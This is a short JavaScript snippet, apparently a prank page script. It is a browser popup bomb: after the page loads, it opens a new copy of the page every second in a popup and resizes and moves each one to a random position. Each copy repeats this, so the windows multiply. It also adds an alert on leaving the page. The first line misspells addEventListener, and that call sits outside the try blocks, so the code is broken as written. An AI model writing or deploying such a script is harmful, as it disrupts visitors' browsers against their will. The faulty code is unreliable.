window.addEventistener('beforeunload', function(){
return alert("Hey :)");
});

try{
document.body.style.backgroundImage = "url('bg.gif')";
window.addEventListener("load", function(){
try{
var win;
setTimeout(function(){
setInterval(function(){
win = window.open(location.href, "", 'width=400, height=200');
win.resizeTo(Math.random() * screen.width, Math.random() * screen.height);
win.moveTo(Math.random() * screen.width, Math.random() * screen.height);
}, 1000);
}, 1000);
} catch(e){
  alert(e.message);
}
});
} catch(e){
  alert(e.message);
}
